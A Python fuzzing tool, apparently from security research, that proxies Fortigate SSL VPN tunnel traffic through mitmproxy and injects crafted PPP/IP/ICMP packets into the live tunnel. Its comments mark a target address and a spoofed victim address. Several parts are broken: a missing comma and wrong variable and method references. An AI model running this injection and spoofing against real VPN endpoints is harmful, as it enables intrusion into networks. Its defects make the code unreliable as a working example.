#!/bin/env python

# SSL VPN tunnel fuzzer based on mitmproxy and Scapy.
# Copyright (C) 2024 Ta-Lun Yen, TXOne Networks Inc.
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Library General Public
# License as published by the Free Software Foundation; either
# version 2 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Library General Public License for more details.
#
# You should have received a copy of the GNU Library General Public
# License along with this library; if not, see
# <https://www.gnu.org/licenses/>.


import asyncio
from mitmproxy import options
from mitmproxy.tools import dump
from mitmproxy import tcp
from mitmproxy import ctx
from scapy.layers.inet import IP, ICMP
from scapy.layers.ppp import PPP
import logging
import strutils

def build_forti_header(packet) -> bytes:
    byte_0 = (6 + len(packet)) >> 8
    byte_1 = (6 + len(packet)) & 0xff
    byte_4 = len(packet) >> 8
    byte_5 = len(packet) & 0xff
    return int.to_bytes(byte_0) + \
        int.to_bytes(byte_1) + \
        b"\x50\x50" + \
        int.to_bytes(byte_4) + \
        int.to_bytes(byte_5)


def tcp_message(flow: tcp.TCPFlow):
    message = flow.messages[-1]
    message.content = message.content.replace(b"foo", b"bar")

    logging.info(
        f"tcp_message[from_client={message.from_client}), content=\
        {strutils.bytes_to_escaped_str(message.content)}]"
    )


class FortigateSslVpn:
    def __init__(self):
        pass

    def http_is_start(self, req: bytes) -> bool:
        return b"GET /remote/sslvpn-tunnel" in bytes

    def http_is_end(self, req: bytes) -> bool:
        return b"GET /remote/logout" in req


class SslVpnHandler:
    def __init__(self):
        self.vpn = FortigateSslVpn()
        self.ctr = 0

    @staticmethod
    def is_http(payload: bytes):
        methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS"]
        return payload[:6].decode() in methods

    def is_sslvpn_start(self):
        return SslVpnHandler.is_http and self.vpn.http_is_start()

    def is_sslvpn_end(self):
        return SslVpnHandler.is_http and self.vpn.http_is_end()

    def dissect_payload(self, payload: bytes):
        pass




class RequestLogger:
    def __init__(self):
        self.sent = False
        self.ctr = 0
        self.start_drop = False

    def responseheaders(self, flow):
        flow.request.stream = True

    def tcp_message(self, flow: tcp.TCPFlow):
        last_msg = flow.messages[-1]

        direction = "<-"
        if last_msg.from_client:
            direction = "->"


        if last_msg.content[:3] in [b"GET", b"PUT"] or last_msg.content[:4] in [b"POST", b"HTTP"] or last_msg.content[:6] in [b"OPTIONS", b"DELETE"]:
            print(flow, direction, last_msg.content)
        else:
            print(flow, direction, last_msg.content)

        if not self.sent and len(flow.messages) > 240:
            self.sent = True
            for i in range(210, 220):
                # ICMP packet; insert our payload here.
                payload = b"""gS\x1dd\x00\x00\x00\x00\xcc\x0c\x08\x00\x00\x00\
                    \x00\x00\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\\
                    x1c\x1d\x1e\x1f !"#$%&\'()*+,-./blaidd0""" + \
                    int(i).to_bytes(length=1, byteorder="little")

                p = PPP(proto="Internet Protocol version 4") / IP(
                    dst="dst_address" # change to target
                    src="src_address".format(i), # change to spoof victim
                    flags="DF",
                    version=4,
                    ihl=5,
                    tos=0,
                    frag=0,
                    ttl=64
                )/ICMP()/payload

                # Scapy bug: if first byte is 0x0, it will be omitted
                if len(p["PPP"].proto.to_bytes()) == 1:
                    ppp_proto_prefix = b"\x00"
                    p = ppp_proto_prefix + bytes(p)

                ctx.master.commands.call(
                    "inject.tcp", flow, False,
                    build_forti_header(bytes(p)) + bytes(p)
                )


async def start_proxy(host):
    # mitmproxy --showhost --set block_global=false --set certs=../forti-cert/testfg.dev.pem --ssl-insecure --mode wireguard:../wgk.conf@31338
    opts = options.Options(
        certs=["*=../forti-cert.dev.pem"],
        mode=["wireguard:../wgk.conf@31338"],
        ssl_insecure=True,
        http2=True
    )

    master = dump.DumpMaster(
        opts,
        with_termlog=False,
        with_dumper=False
    )
    master.addons.add(RequestLogger())

    await master.run()
    return master

if __name__ == '__main__':
    tgt_ip = "<target ssl vpn IP>"
    host = tgt_ip
    asyncio.run(start_proxy(host))
